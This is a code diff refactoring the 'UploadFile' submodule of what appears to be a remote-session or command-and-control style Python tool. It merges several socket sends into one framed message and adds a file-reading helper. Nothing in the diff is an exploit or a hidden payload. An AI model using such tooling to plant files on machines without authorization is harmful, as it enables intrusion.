@@ -1,4 +1,6 @@
 from Server import Server
+import base64
+import struct
 
 class UploadFile:
     """
@@ -27,10 +29,15 @@ class UploadFile:
         remote_file_encoded = data[1]
 
         #Send file contents and where to store it
-        server.sendTo(client, b'upload' )
-        server.sendTo(client, contents)
-        server.sendTo(client, remote_file_encoded)
+        server.sendTo(client, b'upload' + remote_file_encoded + b'FILE_START' + contents)
 
+
+
+    def openFile(self, path):
+        with open(path, 'rb') as f:
+            data = f.read()
+
+        return data
 
     def execute(self):
         """
@@ -40,11 +47,11 @@ class UploadFile:
         print(f"Executing Submodule {self.name} - {self.description}")
         server = Server.getInstance()
 
-        with open(self._local_file, 'rb') as f:
-            data = f.read()
+        # Read file contents
+        data = self.openFile(self._local_file)
 
         # Send data and path
-        sendFile(server, self._currentSession - 1, [data, self._remote_file.encode()])
+        self.sendFile(server, self._currentSession - 1, [data, self._remote_file.encode('utf-8')])
 
         return f"Done! File {self._local_file} uploaded to {self._remote_file}"
 
